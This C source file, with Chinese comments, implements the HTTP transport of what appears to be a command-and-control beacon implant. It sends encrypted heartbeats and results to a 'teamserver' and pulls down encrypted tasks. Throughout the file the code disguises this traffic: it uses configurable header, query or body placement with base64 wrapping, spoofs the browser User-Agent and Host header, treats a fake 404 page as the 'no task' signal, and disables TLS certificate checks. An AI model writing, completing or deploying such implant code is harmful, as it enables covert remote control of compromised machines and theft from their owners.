#include "beacon_transport.h"

#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

#ifndef WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2
#define WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 0x00000800
#endif

#define HTTP_TRANSFORM_LOC_BODY 1u
#define HTTP_TRANSFORM_LOC_HEADER 2u
#define HTTP_TRANSFORM_LOC_QUERY 3u
#define HTTP_TRANSFORM_ENC_RAW 1u
#define HTTP_TRANSFORM_ENC_BASE64 2u
#define HTTP_TRANSFORM_ENC_BASE64URL 3u
#define HTTP_TRANSFORM_OUT_BINARY 1u
#define HTTP_TRANSFORM_OUT_PRINT 2u
#define HTTP_TRANSFORM_MAX_HEADERS 2u

/* teamserver 约定的无任务哨兵：transform 模式下默认 404 页面表示本轮无任务 */
#define HTTP_NOT_FOUND_SENTINEL "404 page not found"

/* HTTP external transform 传输层负责按 profile wire transform 编解码请求/响应。 */

typedef struct HttpTransformHeader {
    CHAR name[64];
    ByteBuf value;
} HttpTransformHeader;

typedef struct HttpTransformRequest {
    const CHAR* method;
    HttpTransformHeader headers[HTTP_TRANSFORM_MAX_HEADERS];
    SIZE_T header_count;
    CHAR query_name[64];
    ByteBuf query_value;
    INT has_query;
    ByteBuf body;
    INT has_body;
    const CHAR* content_type;
} HttpTransformRequest;

/* 从配置构建完整 URL（协议 + 主机 + URI）到调用方缓冲区。成功返回 1 */
static INT BuildUrl(const Profile* profile, CHAR* out, SIZE_T out_len)
{
    const CHAR* scheme = profile->http.ssl ? "https" : "http";

    if (profile->http.target[0] == 0 || profile->http.uri[0] == 0) {
        return 0;
    }

    snprintf(out, out_len, "%s://%s%s", scheme, profile->http.target, profile->http.uri);
    return 1;
}

/* 将原始字节编码为标准 base64 或 base64url。 */
static INT Base64EncodeToBuf(const BYTE8* data, SIZE_T len, INT url, INT pad, ByteBuf* out)
{
    static const CHAR table_std[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    static const CHAR table_url[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    const CHAR* table = url ? table_url : table_std;
    SIZE_T out_cap;
    SIZE_T i = 0;

    BbInit(out);
    if (len > (((SIZE_T)-1) / 4) * 3) {
        return 0;
    }

    out_cap = ((len + 2) / 3) * 4;
    if (!pad) {
        if (len % 3 == 1) out_cap -= 2;
        else if (len % 3 == 2) out_cap -= 1;
    }
    if (!BbReserve(out, out_cap)) {
        return 0;
    }

    while (i < len) {
        SIZE_T rem = len - i;
        UINT32 b0 = data[i++];
        UINT32 b1 = rem > 1 ? data[i++] : 0;
        UINT32 b2 = rem > 2 ? data[i++] : 0;
        UINT32 n = (b0 << 16) | (b1 << 8) | b2;

        out->data[out->len++] = (BYTE8)table[(n >> 18) & 63];
        out->data[out->len++] = (BYTE8)table[(n >> 12) & 63];
        if (rem > 1) {
            out->data[out->len++] = (BYTE8)table[(n >> 6) & 63];
        } else if (pad) {
            out->data[out->len++] = '=';
        }
        if (rem > 2) {
            out->data[out->len++] = (BYTE8)table[n & 63];
        } else if (pad) {
            out->data[out->len++] = '=';
        }
    }

    return 1;
}

/* 返回 base64 字符值，并通过 is_pad 标记 '=' padding。 */
static INT Base64CharValue(BYTE8 c, INT url, INT* is_pad)
{
    *is_pad = 0;
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (!url && c == '+') return 62;
    if (!url && c == '/') return 63;
    if (url && c == '-') return 62;
    if (url && c == '_') return 63;
    if (c == '=') {
        *is_pad = 1;
        return 0;
    }
    return -1;
}

/* 判断 base64 文本边界处可忽略的空白字节。 */
static INT IsSpaceByte(BYTE8 c)
{
    return c == ' ' || c == '\t' || c == '\r' || c == '\n';
}

/* 解码标准 base64 或 base64url，允许首尾空白和省略 padding。 */
static INT Base64DecodeToBuf(const BYTE8* data, SIZE_T len, INT url, ByteBuf* out)
{
    const BYTE8* start = data;
    const BYTE8* end = data + len;
    SIZE_T text_len;
    SIZE_T padded_len;
    SIZE_T i;

    BbInit(out);

    /* 只裁剪首尾空白；中间空白视为非法输入。 */
    while (start < end && IsSpaceByte(*start)) start++;
    while (end > start && IsSpaceByte(*(end - 1))) end--;

    text_len = (SIZE_T)(end - start);
    if (text_len == 0) {
        return 1;
    }
    if (text_len % 4 == 1) {
        return 0;
    }

    padded_len = ((text_len + 3) / 4) * 4;
    if (!BbReserve(out, (padded_len / 4) * 3)) {
        return 0;
    }

    /* 每 4 个字符恢复最多 3 个字节，缺失 padding 按 '=' 补齐。 */
    for (i = 0; i < padded_len; i += 4) {
        INT v[4];
        INT pad_count = 0;
        INT saw_pad = 0;
        INT j;
        UINT32 n;

        for (j = 0; j < 4; ++j) {
            BYTE8 c = (i + (SIZE_T)j < text_len) ? start[i + (SIZE_T)j] : '=';
            INT is_pad = 0;
            v[j] = Base64CharValue(c, url, &is_pad);
            if (v[j] < 0) {
                return 0;
            }
            if (is_pad) {
                saw_pad = 1;
                pad_count++;
            } else if (saw_pad) {
                return 0;
            }
        }

        if (pad_count > 2 || (pad_count && i + 4 != padded_len)) {
            return 0;
        }

        n = ((UINT32)v[0] << 18) | ((UINT32)v[1] << 12) | ((UINT32)v[2] << 6) | (UINT32)v[3];
        out->data[out->len++] = (BYTE8)((n >> 16) & 0xff);
        if (pad_count < 2) out->data[out->len++] = (BYTE8)((n >> 8) & 0xff);
        if (pad_count < 1) out->data[out->len++] = (BYTE8)(n & 0xff);
    }

    return 1;
}

/* 安全关闭非空的 WinHTTP 句柄 */
static VOID HttpClose(HINTERNET h)
{
    if (h) WinHttpCloseHandle(h);
}

/* Windows 7 WinHTTP defaults can still offer only TLS 1.0. Force TLS 1.2 for HTTPS. */
static INT HttpForceTls12(HINTERNET session)
{
    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;

    if (!session) {
        return 0;
    }

    return WinHttpSetOption(session,
                            WINHTTP_OPTION_SECURE_PROTOCOLS,
                            &protocols,
                            sizeof(protocols)) ? 1 : 0;
}

/* 初始化单次 HTTP transform 请求描述。 */
static VOID HttpTransformRequestInit(HttpTransformRequest* req, const CHAR* method)
{
    SIZE_T i;

    ZeroMemory(req, sizeof(*req));
    req->method = method;
    req->content_type = "application/octet-stream";
    BbInit(&req->query_value);
    BbInit(&req->body);
    for (i = 0; i < HTTP_TRANSFORM_MAX_HEADERS; ++i) {
        BbInit(&req->headers[i].value);
    }
}

/* 释放单次 HTTP transform 请求中持有的动态缓冲区。 */
static VOID HttpTransformRequestFree(HttpTransformRequest* req)
{
    SIZE_T i;

    if (!req) return;
    BbFree(&req->query_value);
    BbFree(&req->body);
    for (i = 0; i < HTTP_TRANSFORM_MAX_HEADERS; ++i) {
        BbFree(&req->headers[i].value);
    }
}

/* 按 profile transform 规则编码 payload 并加前后缀。 */
static INT HttpTransformEncode(const HttpDataTransform* spec, const ByteBuf* input, ByteBuf* wire)
{
    ByteBuf encoded;
    INT ok = 0;

    BbInit(wire);
    BbInit(&encoded);
    if (!spec || !spec->present || !input) {
        return 0;
    }

    /* transform encoding 先把原始 payload 转成 wire value。 */
    switch (spec->encoding) {
    case HTTP_TRANSFORM_ENC_RAW:
        if (!BbAppend(&encoded, input->data, input->len)) goto cleanup;
        break;
    case HTTP_TRANSFORM_ENC_BASE64:
        if (!Base64EncodeToBuf(input->data, input->len, 0, 1, &encoded)) goto cleanup;
        break;
    case HTTP_TRANSFORM_ENC_BASE64URL:
        if (!Base64EncodeToBuf(input->data, input->len, 1, 0, &encoded)) goto cleanup;
        break;
    default:
        goto cleanup;
    }

    if (!BbAppend(wire, spec->prefix, strlen(spec->prefix)) ||
        !BbAppend(wire, encoded.data, encoded.len) ||
        !BbAppend(wire, spec->suffix, strlen(spec->suffix))) {
        goto cleanup;
    }
    ok = 1;

cleanup:
    BbFree(&encoded);
    if (!ok) BbFree(wire);
    return ok;
}

/* 从响应 wire value 中去掉前后缀并按配置解码。 */
static INT HttpTransformDecode(const HttpDataTransform* spec, const ByteBuf* wire, ByteBuf* output)
{
    const BYTE8* data;
    SIZE_T len;
    SIZE_T prefix_len;
    SIZE_T suffix_len;

    BbInit(output);
    if (!spec || !spec->present || !wire) {
        return 0;
    }

    data = wire->data;
    len = wire->len;
    prefix_len = strlen(spec->prefix);
    suffix_len = strlen(spec->suffix);

    if (prefix_len) {
        if (len < prefix_len || memcmp(data, spec->prefix, prefix_len) != 0) {
            return 0;
        }
        data += prefix_len;
        len -= prefix_len;
    }
    if (suffix_len) {
        if (len < suffix_len || memcmp(data + len - suffix_len, spec->suffix, suffix_len) != 0) {
            return 0;
        }
        len -= suffix_len;
    }

    switch (spec->encoding) {
    case HTTP_TRANSFORM_ENC_RAW:
        return BbAppend(output, data, len);
    case HTTP_TRANSFORM_ENC_BASE64:
        return Base64DecodeToBuf(data, len, 0, output);
    case HTTP_TRANSFORM_ENC_BASE64URL:
        return Base64DecodeToBuf(data, len, 1, output);
    default:
        return 0;
    }
}

/* 根据输出模式选择请求体 Content-Type。 */
static INT HttpTransformBodyContentType(UINT8 output_mode, const CHAR** content_type)
{
    if (!content_type) {
        return 0;
    }
    switch (output_mode) {
    case HTTP_TRANSFORM_OUT_PRINT:
        *content_type = "text/plain; charset=utf-8";
        return 1;
    case HTTP_TRANSFORM_OUT_BINARY:
    case 0:
        *content_type = "application/octet-stream";
        return 1;
    default:
        return 0;
    }
}

/* 将一个 transform 输入放入 body/header/query 三种位置之一。 */
static INT HttpTransformApplyInput(HttpTransformRequest* req, const HttpDataTransform* spec, const ByteBuf* input)
{
    ByteBuf wire;
    INT ok = 0;

    BbInit(&wire);
    if (!req || !spec || !input || !spec->present) {
        return 0;
    }
    if (!HttpTransformEncode(spec, input, &wire)) {
        return 0;
    }

    /* 每个请求只允许一个 body 和一个 query，header 最多两个。 */
    switch (spec->location) {
    case HTTP_TRANSFORM_LOC_BODY:
        if (req->has_body) goto cleanup;
        req->body = wire;
        BbInit(&wire);
        req->has_body = 1;
        if (!HttpTransformBodyContentType(spec->output_mode, &req->content_type)) goto cleanup;
        ok = 1;
        break;
    case HTTP_TRANSFORM_LOC_HEADER:
        if (!spec->name[0] || req->header_count >= HTTP_TRANSFORM_MAX_HEADERS) goto cleanup;
        strcpy_s(req->headers[req->header_count].name,
                 sizeof(req->headers[req->header_count].name),
                 spec->name);
        req->headers[req->header_count].value = wire;
        BbInit(&wire);
        req->header_count++;
        ok = 1;
        break;
    case HTTP_TRANSFORM_LOC_QUERY:
        if (!spec->name[0] || req->has_query) goto cleanup;
        strcpy_s(req->query_name, sizeof(req->query_name), spec->name);
        req->query_value = wire;
        BbInit(&wire);
        req->has_query = 1;
        ok = 1;
        break;
    default:
        break;
    }

cleanup:
    BbFree(&wire);
    return ok;
}

/* 判断 URL query 中无需百分号编码的字节。 */
static INT UrlIsUnreserved(BYTE8 c)
{
    return (c >= 'A' && c <= 'Z') ||
           (c >= 'a' && c <= 'z') ||
           (c >= '0' && c <= '9') ||
           c == '-' || c == '_' || c == '.' || c == '~';
}

/* 向 URL 字符串追加单个字符并保持 NUL 终止。 */
static INT UrlAppendChar(CHAR* out, SIZE_T out_len, SIZE_T* pos, CHAR c)
{
    if (*pos + 1 >= out_len) {
        return 0;
    }
    out[*pos] = c;
    (*pos)++;
    out[*pos] = 0;
    return 1;
}

/* 向 URL query 追加百分号编码后的字节序列。 */
static INT UrlAppendEncoded(CHAR* out, SIZE_T out_len, SIZE_T* pos, const BYTE8* data, SIZE_T len)
{
    static const CHAR hex[] = "0123456789ABCDEF";
    SIZE_T i;

    for (i = 0; i < len; ++i) {
        BYTE8 c = data[i];
        if (UrlIsUnreserved(c)) {
            if (!UrlAppendChar(out, out_len, pos, (CHAR)c)) return 0;
        } else {
            if (!UrlAppendChar(out, out_len, pos, '%') ||
                !UrlAppendChar(out, out_len, pos, hex[(c >> 4) & 0xf]) ||
                !UrlAppendChar(out, out_len, pos, hex[c & 0xf])) {
                return 0;
            }
        }
    }
    return 1;
}

/* 构建带 transform query 参数的最终 URL。 */
static INT BuildUrlWithQuery(const Profile* profile, const HttpTransformRequest* req, CHAR* out, SIZE_T out_len)
{
    SIZE_T pos;

    if (!BuildUrl(profile, out, out_len)) {
        return 0;
    }
    if (!req || !req->has_query) {
        return 1;
    }

    pos = strlen(out);
    if (!UrlAppendChar(out, out_len, &pos, strchr(out, '?') ? '&' : '?') ||
        !UrlAppendEncoded(out, out_len, &pos, (const BYTE8*)req->query_name, strlen(req->query_name)) ||
        !UrlAppendChar(out, out_len, &pos, '=') ||
        !UrlAppendEncoded(out, out_len, &pos, req->query_value.data, req->query_value.len)) {
        return 0;
    }
    return 1;
}

/* header value 中不允许出现 NUL。 */
static INT HttpValueHasNul(const BYTE8* data, SIZE_T len)
{
    SIZE_T i;

    for (i = 0; i < len; ++i) {
        if (data[i] == 0) return 1;
    }
    return 0;
}

/* 将任意字节 header value 组装为 WinHTTP header 行并添加到请求。 */
static INT HttpAddHeaderBytes(HINTERNET request, const CHAR* name, const BYTE8* value, SIZE_T value_len)
{
    SIZE_T name_len;
    SIZE_T line_len;
    CHAR* line = NULL;
    WCHAR* header_w = NULL;
    INT ok = 0;

    if (!request || !name || !name[0] || HttpValueHasNul(value, value_len)) {
        return 0;
    }

    name_len = strlen(name);
    if (name_len > ((SIZE_T)-1) - value_len - 3) {
        return 0;
    }
    line_len = name_len + 2 + value_len;
    line = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, line_len + 1);
    if (!line) {
        return 0;
    }

    memcpy(line, name, name_len);
    line[name_len] = ':';
    line[name_len + 1] = ' ';
    if (value_len) {
        memcpy(line + name_len + 2, value, value_len);
    }

    header_w = Utf8ToWide(line);
    if (!header_w) goto cleanup;
    ok = WinHttpAddRequestHeaders(request, header_w, (DWORD)-1,
                                  WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE) ? 1 : 0;

cleanup:
    HeapFree(GetProcessHeap(), 0, header_w);
    HeapFree(GetProcessHeap(), 0, line);
    return ok;
}

/* 读取完整 HTTP 响应体到 ByteBuf。 */
static INT HttpReadResponseBody(HINTERNET request, ByteBuf* response)
{
    BbInit(response);
    for (;;) {
        DWORD avail = 0;
        DWORD read = 0;

        if (!WinHttpQueryDataAvailable(request, &avail)) return 0;
        if (!avail) break;

        if (!BbReserve(response, response->len + avail)) return 0;
        if (!WinHttpReadData(request, response->data + response->len, avail, &read)) return 0;
        response->len += read;
    }
    return 1;
}

/* transform 模式下空响应和默认 404 都表示本轮没有任务。 */
static INT HttpIsNoTaskBody(const ByteBuf* response)
{
    static const CHAR not_found[] = HTTP_NOT_FOUND_SENTINEL;

    if (!response || response->len == 0) {
        return 1;
    }
    return response->len == sizeof(not_found) - 1 &&
           memcmp(response->data, not_found, response->len) == 0;
}

/* 发送一次已组装的 HTTP transform 请求并读取原始响应体。 */
static INT HttpTransformSendOnce(const Profile* profile, const HttpTransformRequest* req, ByteBuf* response)
{
    CHAR url_a[1024];
    WCHAR* url_w = NULL;
    WCHAR* ua_w = NULL;
    WCHAR* method_w = NULL;
    HINTERNET session = NULL, connect = NULL, request = NULL;
    URL_COMPONENTS parts;
    DWORD flags = 0;
    INT ok = 0;
    WCHAR host[256];
    WCHAR path[512];
    WCHAR extra[512];
    WCHAR request_path[1024];
    INTERNET_PORT port = 0;
    SIZE_T i;

    BbInit(response);
    /* URL/UA/method 先转宽字符串，以适配 WinHTTP 接口。 */
    if (!BuildUrlWithQuery(profile, req, url_a, sizeof(url_a))) goto cleanup;

    url_w = Utf8ToWide(url_a);
    ua_w = Utf8ToWide(profile->http.user_agent[0] ? profile->http.user_agent : "Mozilla/5.0");
    method_w = Utf8ToWide(req->method);
    if (!url_w || !ua_w || !method_w) goto cleanup;

    ZeroMemory(&parts, sizeof(parts));
    ZeroMemory(path, sizeof(path));
    ZeroMemory(extra, sizeof(extra));
    ZeroMemory(request_path, sizeof(request_path));
    parts.dwStructSize = sizeof(parts);
    parts.lpszHostName = host;
    parts.dwHostNameLength = ARRAYSIZE(host);
    parts.lpszUrlPath = path;
    parts.dwUrlPathLength = ARRAYSIZE(path);
    parts.lpszExtraInfo = extra;
    parts.dwExtraInfoLength = ARRAYSIZE(extra);
    if (!WinHttpCrackUrl(url_w, 0, 0, &parts)) goto cleanup;
    port = parts.nPort;

    /* WinHTTPOpenRequest 需要 path + extra，不包含 scheme/host。 */
    if (extra[0]) {
        swprintf_s(request_path, ARRAYSIZE(request_path), L"%s%s", path, extra);
    } else {
        swprintf_s(request_path, ARRAYSIZE(request_path), L"%s", path);
    }

    session = WinHttpOpen(ua_w, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) goto cleanup;
    if (parts.nScheme == INTERNET_SCHEME_HTTPS && !HttpForceTls12(session)) goto cleanup;

    {
        DWORD timeout = (DWORD)((profile->conn_timeout_sec > 0 ? profile->conn_timeout_sec : 10) * 1000);
        WinHttpSetTimeouts(session, timeout, timeout, timeout, timeout);
    }

    connect = WinHttpConnect(session, host, port, 0);
    if (!connect) goto cleanup;
    if (parts.nScheme == INTERNET_SCHEME_HTTPS) flags |= WINHTTP_FLAG_SECURE;

    request = WinHttpOpenRequest(connect, method_w, request_path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!request) goto cleanup;

    /* debug/self-signed 场景允许忽略 HTTPS 证书校验错误。 */
    if (flags & WINHTTP_FLAG_SECURE) {
        DWORD opts = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &opts, sizeof(opts));
    }

    /* Host、Content-Type 和 transform header 都在发送前统一追加。 */
    if (profile->http.host_header[0]) {
        ByteBuf hv;
        BbInit(&hv);
        if (!BbAppend(&hv, profile->http.host_header, strlen(profile->http.host_header)) ||
            !HttpAddHeaderBytes(request, "Host", hv.data, hv.len)) {
            BbFree(&hv);
            goto cleanup;
        }
        BbFree(&hv);
    }

    if (req->content_type && req->content_type[0]) {
        ByteBuf cv;
        BbInit(&cv);
        if (!BbAppend(&cv, req->content_type, strlen(req->content_type)) ||
            !HttpAddHeaderBytes(request, "Content-Type", cv.data, cv.len)) {
            BbFree(&cv);
            goto cleanup;
        }
        BbFree(&cv);
    }

    for (i = 0; i < req->header_count; ++i) {
        if (!HttpAddHeaderBytes(request, req->headers[i].name,
                                req->headers[i].value.data,
                                req->headers[i].value.len)) {
            goto cleanup;
        }
    }

    if (req->has_body && req->body.len > MAXDWORD) goto cleanup;
    if (!WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            req->has_body && req->body.len ? req->body.data : WINHTTP_NO_REQUEST_DATA,
                            req->has_body ? (DWORD)req->body.len : 0,
                            req->has_body ? (DWORD)req->body.len : 0, 0)) goto cleanup;

    if (!WinHttpReceiveResponse(request, NULL)) goto cleanup;
    if (!HttpReadResponseBody(request, response)) goto cleanup;

    ok = 1;

cleanup:
    HttpClose(request);
    HttpClose(connect);
    HttpClose(session);
    HeapFree(GetProcessHeap(), 0, url_w);
    HeapFree(GetProcessHeap(), 0, ua_w);
    HeapFree(GetProcessHeap(), 0, method_w);
    if (!ok) BbFree(response);
    return ok;
}

/* 检查 method transform 是否满足 heartbeat/result 交换所需字段。 */
static INT HttpTransformMethodUsable(const HttpMethodTransform* method, INT has_result)
{
    if (!method || !method->metadata.present || !method->server_output.present) {
        return 0;
    }
    if (has_result && !method->stage_output.present) {
        return 0;
    }
    return 1;
}

/* 根据 profile method 和是否携带 result 选择 GET/POST transform。 */
static const HttpMethodTransform* HttpTransformSelectMethod(const Profile* profile, INT has_result, const CHAR** method_name)
{
    const HttpTransformConfig* transform;

    if (!profile || !method_name) {
        return NULL;
    }

    transform = &profile->http.transform;
    if (!transform->present || transform->version != 1) {
        return NULL;
    }

    if (_stricmp(profile->http.method, "GET") == 0) {
        if (HttpTransformMethodUsable(&transform->get, has_result)) {
            *method_name = "GET";
            return &transform->get;
        }
        return NULL;
    }
    if (_stricmp(profile->http.method, "POST") == 0) {
        if (HttpTransformMethodUsable(&transform->post, has_result)) {
            *method_name = "POST";
            return &transform->post;
        }
        return NULL;
    }

    /*
     * method 为空时两种方法都可用；带 result 的请求优先 POST，避免
     * raw/binary body 走 GET 时被代理、网关或云函数入口丢弃。
     */
    if (has_result) {
        if (HttpTransformMethodUsable(&transform->post, has_result)) {
            *method_name = "POST";
            return &transform->post;
        }
        if (HttpTransformMethodUsable(&transform->get, has_result)) {
            *method_name = "GET";
            return &transform->get;
        }
    } else {
        if (HttpTransformMethodUsable(&transform->get, has_result)) {
            *method_name = "GET";
            return &transform->get;
        }
        if (HttpTransformMethodUsable(&transform->post, has_result)) {
            *method_name = "POST";
            return &transform->post;
        }
    }
    return NULL;
}

/* 完成一次 heartbeat/result 到 tasks 的 HTTP transform 交换。 */
static INT HttpTransformExchangeOnce(const Profile* profile,
                                     const HttpMethodTransform* method,
                                     const CHAR* method_name,
                                     const ByteBuf* encrypted_heartbeat,
                                     const ByteBuf* encrypted_result,
                                     ByteBuf* encrypted_tasks)
{
    HttpTransformRequest req;
    ByteBuf response;
    INT has_result = encrypted_result && encrypted_result->len;
    INT ok = 0;

    BbInit(encrypted_tasks);
    BbInit(&response);
    HttpTransformRequestInit(&req, method_name);

    /* metadata/heartbeat 是每次请求必须携带的输入。 */
    if (!encrypted_heartbeat || !encrypted_heartbeat->len ||
        !HttpTransformApplyInput(&req, &method->metadata, encrypted_heartbeat)) {
        goto cleanup;
    }
    if (has_result && !HttpTransformApplyInput(&req, &method->stage_output, encrypted_result)) {
        goto cleanup;
    }

    /* server_output 是响应中的加密 tasks。 */
    if (!HttpTransformSendOnce(profile, &req, &response)) {
        goto cleanup;
    }
    if (HttpIsNoTaskBody(&response)) {
        ok = 1;
        goto cleanup;
    }
    if (!HttpTransformDecode(&method->server_output, &response, encrypted_tasks)) {
        goto cleanup;
    }
    ok = 1;

cleanup:
    HttpTransformRequestFree(&req);
    BbFree(&response);
    if (!ok) BbFree(encrypted_tasks);
    return ok;
}

/* 对外的 HTTP transform 交换入口，按 reconnect 配置重试。 */
INT TransportHttpTransformExchange(const Profile* profile,
                                   const ByteBuf* encrypted_heartbeat,
                                   const ByteBuf* encrypted_result,
                                   ByteBuf* encrypted_tasks)
{
    const HttpMethodTransform* method;
    const CHAR* method_name = NULL;
    INT has_result = encrypted_result && encrypted_result->len;
    INT attempts;
    INT i;

    BbInit(encrypted_tasks);
    method = HttpTransformSelectMethod(profile, has_result, &method_name);
    if (!method || !method_name) {
        return 0;
    }

    attempts = profile->http.reconnect_count >= 0 ? profile->http.reconnect_count + 1 : 1;
    for (i = 0; i < attempts; ++i) {
        BbFree(encrypted_tasks);
        if (HttpTransformExchangeOnce(profile, method, method_name,
                                      encrypted_heartbeat, encrypted_result,
                                      encrypted_tasks)) {
            return 1;
        }
        if (i + 1 < attempts && profile->http.reconnect_time_ms > 0) {
            Sleep((DWORD)profile->http.reconnect_time_ms);
        }
    }
    BbFree(encrypted_tasks);
    return 0;
}
